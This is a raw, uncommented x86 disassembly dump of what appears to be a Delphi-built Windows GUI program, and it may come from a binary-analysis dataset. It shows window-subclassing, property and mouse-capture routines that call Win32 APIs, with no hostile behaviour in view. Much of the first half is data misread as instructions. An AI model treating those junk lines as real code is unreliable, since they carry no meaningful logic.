add [ eax + 0x48060006 ] al
imul esp [ gs : edi + 0x68 ] 0x44ad1c74
cmp al 0x10
inc eax
add [ eax + eax ] cl
add [ eax ] al
jns r-xdata
inc eax
add [ esi + eax * 8 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop esp
add [ eax ] eax
call [ eax + 0x78004501 ]
das
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480b000a ] al
insb
jo r-xdata
inc esp
imul ebp [ esi + 0x73 ] 0x1c00408d
mov [ eax + eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
mov bl 0x44
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x240044c6 ] dh
add [ eax ] al
add [ ebx + esi * 4 ] al
and [ esi + 0x41 ] ch
add [ eax + 0x1 ] ah
add bh bh
jl r-xdata
add [ eax + 0x2f ] bh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xc6
inc esp
add [ eax + eax ] ah
add [ eax ] al
add al 0xb3
outsd
outsb
je r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + ecx ] bh
inc edx
add [ eax ] al
xor eax 0x8700045
inc eax
add al ch
js r-xdata
inc edx
add [ eax ] dh
cmc
inc esp
add [ eax + ecx - 0xa1bffbe ] ah
inc esp
add ah dh
add [ eax + 0x8 ] dh
mov al 0xb7
inc esp
add [ eax ] bh
add bh bh
call 0x1450aeb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d07000c ] al
popad
jb r-xdata
pop es
inc edx
add [ eax - 0x23ffbdf8 ] cl
or [ edx ] al
mov ah 0xf3
inc esp
add [ 0xfffffffff43c0044 ] dl
inc esp
add [ 0x35240044 ] bh
inc ebp
add [ eax ] dl
test [ eax + eax - 0x7c ] 0xf4
inc esp
add [ ebp - 0x5a5fffbc ] cl
inc esp
add ah bh
hlt
sub_44c662
inc esp
add al cl
movsd [ edi ] [ esi ]
inc esp
add [ eax - 0xb ] bl
inc esp
add al dl
movsd [ edi ] [ esi ]
inc esp
add [ ebp + esi * 8 + 0x44 ] bh
add al bl
movsd [ edi ] [ esi ]
inc esp
add [ esi - 0x987ffbb ] ch
inc esp
add [ eax - 0x5fffbb0a ] bh
cmc
inc esp
add ah ch
movsd [ edi ] [ esi ]
inc esp
add al dh
movsd [ edi ] [ esi ]
inc esp
add ah al
cmc
inc esp
add [ eax ] ch
hlt
sub_44c72a
inc esp
add [ eax ] cl
pop ss
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x65736e49
jb r-xdata
outsb
jb r-xdata
inc edx
outsw
jb r-xdata
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
jbe r-xdata
inc ebp
jbe r-xdata
outsb
outsd
insb
or [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
push 0x6e490774
outsb
je r-xdata
outsb
je r-xdata
inc esp
add [ eax ] dh
outsd
insb
add [ edi ] eax
dec esi
ja r-xdata
add [ eax ] al
add [ esi + 0x3a0044c9 ] bl
int3
jb r-xdata
or [ eax ] cl
push es
push ebx
or [ esi ] al
push ebx
outsb
jb r-xdata
add ecx [ eax ]
push es
add [ eax - 0x34 ] cl
push esp
push edx
arpl [ gs : eax + edx + 0x9 ] si
inc ecx
insb
je r-xdata
imul esp [ edi + 0x6e ] 0x6f666e49
or dl [ ecx + eax * 2 + 0x6c ]
imul esp [ edi + 0x6e ] 0x6f666e49
or [ ecx + 0x6c ] eax
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x74636552
add eax 0x63655254
je r-xdata
or [ edx ] al
inc ebx
xor [ eax ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
dec ecx
outsb
je r-xdata
dec ecx
outsb
outsb
je r-xdata
outsd
insb
or [ edx ] al
inc ebx
xor cl [ eax ]
push esp
inc ebx
outsd
outsb
je r-xdata
outsw
outsd
jo r-xdata
les eax [ eax + eax + 0x3c ]
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
jb r-xdata
ja r-xdata
outsd
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax ] dl
inc eax
add [ eax ] al
dec eax
int3
add [ eax ] ecx
dec ecx
outsb
je r-xdata
dec esi
push es
inc eax
cmp al 0x10
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
lodsb [ esi ]
enter 0x44 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 8 - 0x33b3ffbc ] al
inc esp
jb r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] cl
ja r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test cl cl
inc esp
add [ esp + ecx * 8 + 0x44 ] cl
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
sub_44c882
inc esp
add [ edx + eax ] cl
add [ eax - 0x3f ] ah
inc esp
add [ eax + 0x7 ] dl
inc edx
add [ eax + ecx * 2 + 0x8c0040 ] ah
inc edx
add [ eax + ecx * 2 + 0x5c140040 ] ch
inc ebp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x36 ] bh
inc ebp
add ah al
xchg ecx eax
inc ebp
add ah al
dec esp
inc ebp
add [ eax - 0x62 ] al
inc ecx
add [ eax + 0x4800452f ] bh
inc edi
inc ebp
add [ eax + edi ] ch
inc ebp
add [ esi + eax + 0x45 ] bh
add [ eax + 0x7 ] ch
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add [ esi - 0x7417ffbb ] dh
inc ebp
add ah dh
xchg ecx eax
inc ebp
add [ eax - 0x6f ] al
inc ebp
add [ ecx + edi * 8 + 0x44 ] bh
add [ eax - 0x79 ] al
inc ebp
add [ eax - 0x79 ] ah
inc ebp
add ah cl
add [ ebp ] 0xffffffbc
clc
inc esp
add al al
clc
inc esp
add [ eax - 0x4bffbacf ] cl
xor [ ebp ] eax
cld
cli
inc esp
add [ eax + 0x6 ] ah
inc ebp
add al bh
cli
inc esp
add ah ch
pop es
inc ebp
add [ eax - 0x66 ] ah
inc ebp
add [ eax + 0x2800450a ] al
or [ ebp ] eax
hlt
sub_44cd35
push esi
inc ebp
add al bh
xor [ ebp ] eax
and [ ebp + eax * 2 + 0x4584e000 ] al
add ah dl
jg r-xdata
in al 0x99
inc ebp
add [ ebp + eax * 4 + 0x45 ] dh
add [ eax + 0x10045a4 ] bl
add [ edi ] cl
add ah cl
mov [ 0x540e0045 ] eax
inc ebx
jne r-xdata
add ah al
test [ ebp ] al
movsb [ edi ] [ esi ]
cmp [ ebp ] al
insb
inc eax
inc ebp
add [ esi + ecx * 2 ] ch
inc ebp
add [ eax ] cl
dec eax
inc ebp
add [ ebx + ecx * 2 ] al
inc ebp
add [ ecx + ecx * 2 ] dh
inc ebp
add ah al
dec esi
inc ebp
add al ch
dec esi
inc ebp
add [ edi + ecx * 2 + 0x45 ] bh
add [ eax + 0x2000454d ] al
dec ebp
inc ebp
add [ eax ] ah
cdq
inc ebp
add [ esi + eax * 4 ] cl
inc ebp
add ah ch
mov [ 0xffffffff98940045 ] eax
inc ebp
add [ edx + eax * 4 + 0x45 ] bh
add ah ah
cdq
adc al 0x5c
je r-xdata
inc ebp
add al ch
inc ebp
inc eax
inc eax
add [ esp + ebx * 2 ] dl
insd
inc ebx
outsd
outsb
je r-xdata
add [ esi + eax * 2 ] al
inc eax
add [ ebx - 0x6e3bffbb ] bl
inc ebp
outsd
insb
nop
mov ah 0xcd
inc esp
add [ edi ] al
push cs
push esp
inc ebx
jne r-xdata
dec esp
inc ebp
add [ eax - 0x62 ] al
inc ecx
add [ eax + 0x4800452f ] bh
je r-xdata
add ah al
insd
inc ebx
outsd
outsb
je r-xdata
inc edi
inc ebp
add [ eax + edi ] ch
inc ebp
add [ esi + eax + 0x45 ] bh
add [ eax + 0x7 ] ch
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add ah bl
0x8be80045 0x45
hlt
mov eax 0x4800452f
outsd
insb
mov esp 0x480044cc
int3
sub_44cdfe
inc esp
add [ eax + 0x2 ] ah
add [ eax ] al
jo r-xdata
je r-xdata
inc esp
add [ eax + 0x7 ] dl
inc edx
add [ eax + ecx * 2 + 0x8c0040 ] ah
inc edx
add [ eax + ecx * 2 + 0x5c140040 ] ch
inc ebp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx - 0x6e3bffbb ] bl
inc ebp
add ah al
dec esp
inc ebp
add [ eax - 0x62 ] al
inc ecx
add [ eax + 0x4800452f ] bh
inc edi
inc ebp
add [ eax + edi ] ch
inc ebp
add [ esi + eax + 0x45 ] bh
add [ eax + 0x7 ] ch
inc edx
add [ esp + eax + 0x42 ] cl
add [ esp + eax + 0x42 ] al
add [ eax + 0x7 ] dh
inc edx
add ah bl
0x8be80045 0x45
hlt
outsd
insb
jae r-xdata
add [ ebp - 0x31d7ffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x31 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 8 ] bl
inc esp
add [ esi ] dh
iretd
sub_44cf70
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x280044cf
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ecx ] cl
push esp
inc esp
outsd
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_44d080
inc esp
add [ eax + edx * 8 ] al
inc esp
add [ ecx ] dl
rol [ eax + eax + 0x1e ] 0x1
rol [ eax + eax + 0x2b ] 0x1
rol [ eax + eax + 0x38 ] 0x1
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffffd05ee870 ] eax
inc esp
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
add al 0xd1
inc esp
add [ esi + 0x44d0 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2f ] dl
inc esp
add [ eax + eax ] bh
add ah ah
adc [ eax ] eax
cwde
dec eax
inc eax
add [ eax + esi * 2 + 0x70980040 ] cl
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add [ eax + 0x4004070 ] ch
inc esi
inc eax
add al dl
lodsb [ esi ]
inc ebp
add [ ebp * 4 - 0x2f17ffbb ] ah
inc ebp
add [ eax - 0x4fffba52 ] ah
scasb [ edi ]
inc ebp
add [ eax - 0x4a ] ah
inc ebp
add [ eax ] ch
rol [ ebp ] 0x1
fcom st2
inc ebp
add [ ebx + edx * 8 ] ch
inc ebp
add [ ebx + edi * 4 ] ch
inc ebp
add [ ebp + edi * 4 - 0x2f43ffbb ] dh
inc ebp
add al al
mov edi 0xc5540045
inc ebp
add [ eax - 0x5fffba2d ] ah
retn 0x45
sub_44d140
mov esp 0xec0045cd
mov dl 0x45
add [ eax - 0x55 ] ch
inc ebp
add [ eax + 0x90045bc ] al
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
push ebp
or [ ecx + 0x1b490 ] cl
add [ ebx - 0x17aff7bb ] cl
xor [ ecx - 0x3f7a0005 ] esi
mov eax eax
test al 0xd1
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x300044d1 ] ch
add [ eax ] al
add al al
adc [ eax ] al
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax - 0x2b ] dl
inc ebp
add [ esi ] al
push esp
dec ebp
outsd
jne r-xdata
mov eax [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax + 0x1c0 ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax 0x40000000
je r-xdata
mov eax [ eax + 0x1c0 ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
je r-xdata
nop
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x1b4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call IsWindowUnicode
test eax eax
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x1c0 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongW
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongW
jmp r-xdata
sub_44d2c0
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_44d2f4
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4059dc
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_44d2c0
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_44d350
push ebx
mov ebx eax
mov eax ebx
call sub_44d2f4
test eax eax
setne al
test al al
jne r-xdata
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call [ rw-data ]
sub_44d380
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_44d564
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40e8cc
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_405a44
mov eax edi
mov edx esi
call sub_405584
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44d5a8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40e8cc
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_405a44
mov eax edi
mov edx esi
call sub_405584
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44d5ec
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
add eax [ esi + 0x44 ]
push eax
mov eax [ esp + 0x8 ]
add eax [ esi + 0x40 ]
push eax
push ebx
call SetWindowOrgEx
mov eax ebx
push eax
mov ecx eax
mov edx 0x14
mov eax [ esi + 0x30 ]
call sub_451b4c
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop esi
pop ebx
retn
sub_44d668
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
jne r-xdata
mov eax ebx
call sub_4585f8
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_44d714
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
xor eax eax
mov [ edi ] eax
xor ebx ebx
jmp r-xdata
mov eax [ edi ]
cmp eax [ esi + 0x8 ]
jl r-xdata
mov edx [ edi ]
mov eax esi
call sub_419898
cmp ebp [ eax + 0x4 ]
sete bl
test bl bl
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc [ edi ]
sub_44d74c
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4585f8
mov ebx eax
mov esi ebx
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov esi ebx
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44d778
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_402f00
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_44d74c
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_44d714
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_419740
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_419898
mov edi eax
mov eax [ edi ]
call sub_4585f8
push eax
mov eax [ ebx ]
call sub_4585f8
push eax
call IsChild
test eax eax
je r-xdata
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_419914
jmp r-xdata
inc [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44d7fc
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_419774
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_419898
mov edx 0x8
call sub_402f1c
inc esi
dec ebx
jne r-xdata
sub_44d830
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_419898
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_44d714
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_44d894
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x1c ]
mov [ eax + 0x1c ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
mov ecx [ edx + 0x30 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x34 ] ecx
retn
sub_44d8f4
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_404530
mov edx esp
mov eax esi
call sub_405794
add esp 0x100
pop esi
pop ebx
retn
sub_44d930
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44da2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ edx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_44ea9c
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0x10
call sub_44e40c
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ edx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edx + 0x8 ]
mov [ ebp - 0x10 ] eax
movsx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
movsx eax [ ebp - 0xe ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_44e40c
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ edx + 0xc ] 0x1
xor eax eax
call sub_44ea9c
jmp r-xdata
mov eax [ rw-data ]
add eax 0x10
call sub_44e40c
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_44ea9c
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
jmp r-xdata
mov al 0x1
call sub_44ea9c
jmp r-xdata
xor eax eax
call sub_44ea9c
jmp r-xdata
sub_44da34
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4467a4
call sub_404f40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_44ea9c
sub_44da8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44dab6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44db1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d894
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x40 ]
mov [ ebx + 0x40 ] eax
sub_44db48
push ebp
mov ebp esp
push esi
push edi
mov esi eax
mov edi [ esi + 0x40 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov eax edi
mov si 0xffdd
call sub_40484c
sub_44db6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x40 ]
mov si 0xffdf
call sub_40484c
xor edx edx
sub_44dbc4
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_45a2d8
sub_44dbe4
push ebx
mov ebx eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_45a2c0
sub_44dc08
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44daf8
mov [ ebx + 0x38 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e10
mov esi eax
mov [ ebx + 0x48 ] esi
mov edx 0xffffff
xor eax eax
call sub_42b908
mov edx eax
mov eax esi
call sub_424f8c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_44dc70
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x48 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_44dca0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44db1c
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
movzx edx [ eax + 0x5c ]
mov [ ebx + 0x5c ] dl
mov edx [ eax + 0x60 ]
mov [ ebx + 0x60 ] edx
movzx edx [ eax + 0x74 ]
mov [ ebx + 0x74 ] dl
push esi
lea esi [ eax + 0x4c ]
lea edi [ ebx + 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x64 ]
lea edi [ ebx + 0x64 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_44dd1c
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_44dd40
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
